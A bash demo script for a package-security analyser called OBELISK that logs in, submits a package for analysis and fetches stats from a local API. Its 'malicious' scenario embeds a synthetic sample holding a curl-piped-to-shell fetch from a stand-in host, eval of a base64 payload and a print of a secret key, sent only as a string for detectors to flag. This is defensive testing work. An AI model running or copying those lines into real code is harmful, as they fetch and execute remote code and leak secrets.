#!/usr/bin/env bash
set -euo pipefail

# Interactive OBELISK demo runner:
# 1) Health check
# 2) Login
# 3) Package analysis
# 4) Stats overview
#
# At each step it pauses for Enter and opens a link/file with the result.

# Scenario control:
# - benign (default): analyzes a normal package
# - malicious: uses a synthetic suspicious package + code sample to trigger detectors

BASE_URL="${BASE_URL:-http://localhost:8000}"
DEMO_USERNAME="${DEMO_USERNAME:-admin}"
DEMO_PASSWORD="${DEMO_PASSWORD:-change_me}"
DEMO_SCENARIO="${DEMO_SCENARIO:-benign}"

DEMO_PACKAGE_NAME="${DEMO_PACKAGE_NAME:-}"
DEMO_PACKAGE_VERSION="${DEMO_PACKAGE_VERSION:-}"
DEMO_PACKAGE_REGISTRY="${DEMO_PACKAGE_REGISTRY:-}"
DEMO_CODE="${DEMO_CODE:-}"

DEMO_DIR="${DEMO_DIR:-/tmp/obelisk-demo}"
COOKIE_FILE="$DEMO_DIR/cookies.txt"
STEP1_FILE="$DEMO_DIR/step1_health.json"
STEP2_FILE="$DEMO_DIR/step2_login.json"
STEP3_FILE="$DEMO_DIR/step3_analyze.json"
STEP4_FILE="$DEMO_DIR/step4_stats.json"

if [[ "$DEMO_SCENARIO" == "malicious" ]]; then
  DEMO_PACKAGE_NAME="${DEMO_PACKAGE_NAME:-reactt}"
  DEMO_PACKAGE_VERSION="${DEMO_PACKAGE_VERSION:-1.0.$(date +%s)}"
  DEMO_PACKAGE_REGISTRY="${DEMO_PACKAGE_REGISTRY:-npm}"
  DEMO_CODE='child_process.exec("curl -fsSL http://example.com/install.sh | sh");
os.system("whoami");
subprocess.call("id", shell=True);
const payload = Buffer.from("ZXZpbC1wYXlsb2Fk", "base64").toString();
eval(payload);
console.log(process.env.SECRET_KEY);'
else
  DEMO_PACKAGE_NAME="${DEMO_PACKAGE_NAME:-left-pad}"
  DEMO_PACKAGE_VERSION="${DEMO_PACKAGE_VERSION:-1.3.0}"
  DEMO_PACKAGE_REGISTRY="${DEMO_PACKAGE_REGISTRY:-npm}"
fi

mkdir -p "$DEMO_DIR"

open_target() {
  local target="$1"

  if command -v xdg-open >/dev/null 2>&1; then
    xdg-open "$target" >/dev/null 2>&1 || true
  elif command -v open >/dev/null 2>&1; then
    open "$target" >/dev/null 2>&1 || true
  fi

  echo "Opened: $target"
}

print_json() {
  local file="$1"

  if command -v jq >/dev/null 2>&1; then
    jq . "$file" || cat "$file"
  else
    python3 -m json.tool "$file" 2>/dev/null || cat "$file"
  fi
}

wait_for_next() {
  echo
  read -r -p "Press Enter to continue... " _
}

echo "============================================"
echo "OBELISK Interactive Demo"
echo "============================================"
echo "Base URL: $BASE_URL"
echo "Scenario: $DEMO_SCENARIO"
echo "Package: $DEMO_PACKAGE_NAME@$DEMO_PACKAGE_VERSION ($DEMO_PACKAGE_REGISTRY)"

# Step 1: Health
wait_for_next
echo
echo "STEP 1/4: Health check"
HTTP_CODE=$(curl -sS -o "$STEP1_FILE" -w "%{http_code}" "$BASE_URL/health")
echo "HTTP: $HTTP_CODE"
print_json "$STEP1_FILE"
open_target "$BASE_URL/health"

# Step 2: Login
wait_for_next
echo
echo "STEP 2/4: Login"
LOGIN_PAYLOAD=$(printf '{"username":"%s","password":"%s"}' "$DEMO_USERNAME" "$DEMO_PASSWORD")
HTTP_CODE=$(curl -sS -o "$STEP2_FILE" -w "%{http_code}" -c "$COOKIE_FILE" -X POST "$BASE_URL/api/auth/login" -H "Content-Type: application/json" -d "$LOGIN_PAYLOAD")
echo "HTTP: $HTTP_CODE"
print_json "$STEP2_FILE"
open_target "file://$STEP2_FILE"

# Step 3: Analyze package
wait_for_next
echo
echo "STEP 3/4: Analyze package"
ANALYZE_PAYLOAD=$(DEMO_PACKAGE_NAME="$DEMO_PACKAGE_NAME" DEMO_PACKAGE_VERSION="$DEMO_PACKAGE_VERSION" DEMO_PACKAGE_REGISTRY="$DEMO_PACKAGE_REGISTRY" DEMO_CODE="$DEMO_CODE" python3 - <<'PY'
import json
import os

payload = {
  "name": os.environ["DEMO_PACKAGE_NAME"],
  "version": os.environ["DEMO_PACKAGE_VERSION"],
  "registry": os.environ["DEMO_PACKAGE_REGISTRY"],
}
code = os.environ.get("DEMO_CODE", "")
if code:
  payload["code"] = code
print(json.dumps(payload, separators=(",", ":")))
PY
)
HTTP_CODE=$(curl -sS -o "$STEP3_FILE" -w "%{http_code}" -b "$COOKIE_FILE" -X POST "$BASE_URL/api/packages/analyze" -H "Content-Type: application/json" -d "$ANALYZE_PAYLOAD")
echo "HTTP: $HTTP_CODE"
print_json "$STEP3_FILE"
open_target "file://$STEP3_FILE"

# Step 4: Stats overview
wait_for_next
echo
echo "STEP 4/4: Stats overview"
HTTP_CODE=$(curl -sS -o "$STEP4_FILE" -w "%{http_code}" -b "$COOKIE_FILE" "$BASE_URL/api/stats/overview")
echo "HTTP: $HTTP_CODE"
print_json "$STEP4_FILE"
open_target "file://$STEP4_FILE"

echo
echo "Demo complete."
echo "Saved outputs in: $DEMO_DIR"
echo "- $STEP1_FILE"
echo "- $STEP2_FILE"
echo "- $STEP3_FILE"
echo "- $STEP4_FILE"
